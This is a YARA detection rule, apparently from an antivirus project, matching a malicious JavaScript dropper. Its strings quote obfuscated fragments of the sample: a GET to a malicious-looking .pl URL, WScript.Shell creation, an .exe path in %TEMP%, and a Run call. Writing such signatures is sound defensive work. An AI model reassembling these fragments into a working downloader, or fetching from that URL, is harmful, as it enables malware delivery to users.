rule sig_20160401_69e67ec58d4cac37d59f6c08656e8af7 {
  meta:
    description = "datamaliciousorder - file 20160401_69e67ec58d4cac37d59f6c08656e8af7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1d8b3fc025911399e925591183b67b64f767a881a7d38bdf1f4a2293948d42d6"

  strings:
    $s1  = "QoHz[EuJqm](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "var HuVkb = function VjYk() {return WScript[EcvDek](\"WScript\"+\".Shell\");}(), HruSxi = 11;" fullword ascii
    $s3  = "function MkDv(AanOo, ZylEs){FtXpa = FtXpa * 1; return AanOo - ZylEs;};" fullword ascii
    $s4  = "if (QoHz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BpSik() {return HuVkb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"tO7ldXeqgau76oQl.ex\" + \"e\";};" fullword ascii
    $s6  = "function KuYj(){return UwXe + \"\";};" fullword ascii
    $s7  = "function ZnjUt() {return ((AqDx == true) && (AqDx == JakRvr)) ? 1 : FtXpa;};" fullword ascii
    $s8  = "function FflPzz(){return EcvDek;};" fullword ascii
    $s9  = "function PdDxg(QxaGij) {var ExwLak = (1, 2, 3, 4, 5, QxaGij); return ExwLak;};" fullword ascii
    $s10 = "var GlbOj = false;" fullword ascii
    $s11 = "JakRvr = true; " fullword ascii
    $s12 = "var LkTfk = new this[\"Date\"]();" fullword ascii
    $s13 = "}while (RtVrj);" fullword ascii
    $s14 = "var AqDx = false;" fullword ascii
    $s15 = "function ZlrIkz(UhNuw){HuVkb[\"R\"+\"un\"](UhNuw, FtXpa, FtXpa);};" fullword ascii
    $s16 = "return MkDv(ArjPy, PzPxl);" fullword ascii
    $s17 = "function KaKe(){return 23;};" fullword ascii
    $s18 = "var JakRvr = false;" fullword ascii
    $s19 = "AqDx = true; " fullword ascii
    $s20 = "function IrYxl()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}